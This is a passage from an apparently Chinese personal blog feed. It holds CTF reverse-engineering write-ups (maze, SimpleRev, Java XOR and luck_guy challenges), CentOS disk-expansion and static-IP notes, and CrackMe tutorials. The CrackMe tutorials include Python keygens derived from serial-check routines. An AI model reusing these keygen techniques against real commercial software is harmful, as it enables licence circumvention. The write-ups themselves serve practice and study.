)</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 != 4 )</span><br><span class="line">LABEL_13:</span><br><span class="line">          exit(1);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[25];</span><br><span class="line">    &#125;</span><br><span class="line">    for ( i = 0; i &lt;= 1; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_DWORD *)&amp;v3[4 * i + 25] &gt;= 5u )</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 49 )   // 1  关键代码</span><br><span class="line">      exit(1);</span><br><span class="line">    if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 35 )   // #  输入的顺序就是flag</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;\nok, the order you enter is the flag!&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对可疑的字符串进行分析，发现这串字符可以分为5行5列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br></pre></td></tr></table></figure><p>发现他有0和1，和#<br> 这个应该就是迷宫了<br> 要求我们从*走到#就<br> 不走向1，否则退出</p><p>所以我们的顺序是：222441144222</p><p>所以得到flag:<br> flag{222441144222}</p><h1 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h1><p>以下是main函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char v4; // [rsp+Fh] [rbp-1h]</span><br><span class="line"></span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;);</span><br><span class="line">      v4 = getchar();</span><br><span class="line">      if ( v4 != 100 &amp;&amp; v4 != 68 )</span><br><span class="line">        break;</span><br><span class="line">      Decry(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v4 == 113 || v4 == 81 )</span><br><span class="line">      Exit(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv);</span><br><span class="line">    puts(&quot;Input fault format!&quot;);</span><br><span class="line">    v3 = getchar();</span><br><span class="line">    putchar(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的函数是以下函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 Decry()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [rsp+Fh] [rbp-51h]</span><br><span class="line">  int v2; // [rsp+10h] [rbp-50h]</span><br><span class="line">  int v3; // [rsp+14h] [rbp-4Ch]</span><br><span class="line">  int i; // [rsp+18h] [rbp-48h]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-44h]</span><br><span class="line">  char src[8]; // [rsp+20h] [rbp-40h] BYREF</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  __int64 v9[2]; // [rsp+40h] [rbp-20h] BYREF</span><br><span class="line">  int v10; // [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  *(_QWORD *)src = &#x27;SLCDN&#x27;;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9[0] = &#x27;wodah&#x27;;</span><br><span class="line">  v9[1] = 0LL;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  text = (char *)join(key3, v9);</span><br><span class="line">  strcpy(key, key1);</span><br><span class="line">  strcat(key, src);</span><br><span class="line">  v2 = 0;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = strlen(key);</span><br><span class="line">  for ( i = 0; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( key[v3 % v5] &gt; &#x27;@&#x27; &amp;&amp; key[v3 % v5] &lt;= &#x27;Z&#x27; )</span><br><span class="line">      key[i] = key[v3 % v5] + 32;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Please input your flag:&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    if ( v1 == &#x27;\n&#x27; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v1 == &#x27; &#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v1 &lt;= 96 || v1 &gt; 122 )   // 主要函数</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - &#x27;\&#x27;&#x27; - key[v3 % v5] + &#x27;a&#x27;) % 26 + 97;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !(v3 % v5) )</span><br><span class="line">        putchar(32);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !strcmp(text, str2) )</span><br><span class="line">    puts(&quot;Congratulation!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Try again!\n&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写攻击脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> v3=<span class="number">10</span>;<span class="comment">//长度 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">128</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="string">&#x27;A&#x27;</span> || j &gt; <span class="string">&#x27;z&#x27;</span> || j &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; j &lt; <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((j - <span class="number">39</span> - key[v3 % <span class="number">10</span>] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> == text[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,j);</span><br><span class="line">v3++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p000;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Reverse */</span></span><br><span class="line"><span class="comment">/* loaded from: Reverse.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">        String str = s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="keyword">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span>[] arr)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : arr) &#123;</span><br><span class="line">            <span class="keyword">int</span> result = (c + <span class="string">&#x27;@&#x27;</span>) ^ <span class="number">32</span>;</span><br><span class="line">            Resultlist.add(Integer.valueOf(result));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] KEY = &#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : KEY) &#123;</span><br><span class="line">            KEYList.add(Integer.valueOf(i));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是对传入的字符串进行加后再进行相与</p><p>编写逆向脚本可得：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i] - <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>) ^ <span class="number">0x20</span>)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="luck-guy"><a href="#luck-guy" class="headerlink" title="luck_guy"></a>luck_guy</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 get_flag()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  int i; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int j; // [rsp+8h] [rbp-38h]</span><br><span class="line">  __int64 s; // [rsp+10h] [rbp-30h] BYREF</span><br><span class="line">  char v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( rand() % 200 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        puts(&quot;OK, it&#x27;s flag:&quot;);</span><br><span class="line">        memset(&amp;s, 0, 0x28uLL);</span><br><span class="line">        strcat((char *)&amp;s, f1);</span><br><span class="line">        strcat((char *)&amp;s, &amp;f2);</span><br><span class="line">        printf(&quot;%s&quot;, (const char *)&amp;s);</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        printf(&quot;Solar not like you&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        printf(&quot;Solar want a girlfriend&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        s = 0x7F666F6067756369LL;</span><br><span class="line">        v5 = 0;</span><br><span class="line">        strcat(&amp;f2, (const char *)&amp;s);</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        for ( j = 0; j &lt;= 7; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( j % 2 == 1 )</span><br><span class="line">            *(&amp;f2 + j) -= 2;</span><br><span class="line">          else</span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;emmm,you can&#x27;t find flag 23333&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Centos7扩容</title>
      <link href="/2023/04/12/Centos7%E6%89%A9%E5%AE%B9/"/>
      <url>/2023/04/12/Centos7%E6%89%A9%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<p>将虚拟机关机，然后点击VM顶部菜单栏中的显示或隐藏控制台视图按钮来显示已建立的虚拟机的配置信息 ，然后左边菜单栏点击硬盘，在弹出的对话框选中硬盘，并点击扩展按钮，然后在弹出框中的最大磁盘大小修改未所需要的磁盘大小，比如我现在需要扩容15G，原本的磁盘大小是20G，所以我这里将原本的20G修改成35G，然后点击扩展,（如果存在快照，提前上传快照，否则不能扩展）</p><p><a href="https://blog.51cto.com/u_16060121/6176862">https://blog.51cto.com/u_16060121/6176862</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux虚拟机固定ip</title>
      <link href="/2023/04/11/Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%9B%BA%E5%AE%9Aip/"/>
      <url>/2023/04/11/Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%9B%BA%E5%AE%9Aip/</url>
      
        <content type="html"><![CDATA[<h1 id="设置静态IPV4"><a href="#设置静态IPV4" class="headerlink" title="设置静态IPV4"></a>设置静态IPV4</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">centos7的网络IP地址配置文件在/etc/sysconfig/network-scripts文件夹下。</span><br><span class="line">查看当前网卡名称 ifconfig。</span><br><span class="line">ens33网卡对应的配置文件为ifcfg-ens33，使用vim编辑。</span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure><p>修改前：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;dhcp&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;0bf3e1c3-1440-4e3a-afbe-94bb04004184&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;# 使用静态IP地址，默认为dhcp</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPADDR=&quot;172.10.6.56&quot;   # 设置的静态IP地址</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;    # 子网掩码</span><br><span class="line">GATEWAY=&quot;172.10.6.254&quot;    # 网关地址(本地电脑打开cmd，执行ipconfig查询)</span><br><span class="line">DNS1=&quot;8.8.8.8&quot;       # DNS服务器</span><br><span class="line">DNS2=&quot;114.114.114.114&quot;       # DNS服务器</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;0bf3e1c3-1440-4e3a-afbe-94bb04004184&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;# 是否开机启用</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br><span class="line"></span><br><span class="line">然后重新连接，执行ifconfig，如下图，IP已经变成设置的IP了。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>160个CrackMe</title>
      <link href="/2023/04/03/160%E4%B8%AACrackMe/"/>
      <url>/2023/04/03/160%E4%B8%AACrackMe/</url>
      
        <content type="html"><![CDATA[<h1 id="CrackMe001"><a href="#CrackMe001" class="headerlink" title="CrackMe001"></a>CrackMe001</h1><p>程序没有加壳，可以放心逆向</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230403162340.png"></p><p>拖入OD找到以下字符串，可以看到下面的Failed！是错误的弹出，上面的Congratz！是正确的弹出。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230403162501.png"></p><p>此处调用了比较的函数，在此函数处下一个断点，EAX处储存着输入的字符，EDX处储存着需要比较的字符，由于字符是直接写死，所以第一个序列号是一个固定的硬编 码 Hello Dude!</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230404172309.png"></p><p>输入 Hello Dude! 程序弹出正确提示 序列号部分完成</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230404173059.png"></p><p>接下来分析用户名和序列号的部分 这个部分比单纯的序列号要有点难度，先找到入口函数。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230404203323.png"></p><p>首先程序会取输入的用户名的第一位，后将第一位乘0x29再乘2，修改完后的数据存在原来的内存地址中</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230404203544.png"></p><p>后通过栈中的操作，在字符串的前后分别添加 <code> CW-</code>与<code>-CRACKED</code>最后将输入的密码与拼接好的字符串进行匹配。</p><p>注册机：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;CW-&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;-CRACKED&#x27;</span></span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名:&quot;</span>)</span><br><span class="line">username = username[:<span class="number">1</span>:]</span><br><span class="line">username = <span class="built_in">str</span>(<span class="built_in">ord</span>(username) * <span class="built_in">int</span>(<span class="string">&#x27;0x29&#x27;</span>, <span class="number">16</span>) * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密码:&quot;</span>+str1+username+str2)</span><br></pre></td></tr></table></figure><h1 id="CrackMe002"><a href="#CrackMe002" class="headerlink" title="CrackMe002"></a>CrackMe002</h1><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230422195820.png"></p><p>程序提示无壳</p><p>随便输入一个，他提示You Get Wrong,直接去超级字符串+中搜索，发现相应的代码，也可以看到跳转的代码</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230423194306.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230423204409.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230423204726.png"></p><p>该程序首先计算用户名的长度，然后获取用户名的首字母的ascii码值，然后将长度*0x17CFB+用户名首字母的ascii值并将得到的16进制转10进制，最后与密码进行比较。</p><p>注册机：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="built_in">input</span>(<span class="string">&quot;请输入账户：&quot;</span>)</span><br><span class="line"><span class="built_in">len</span> = <span class="built_in">len</span>(str1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AKA-&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span> * <span class="number">0x17CFB</span> + <span class="built_in">ord</span>(str1[<span class="number">0</span>])))</span><br></pre></td></tr></table></figure><p><img 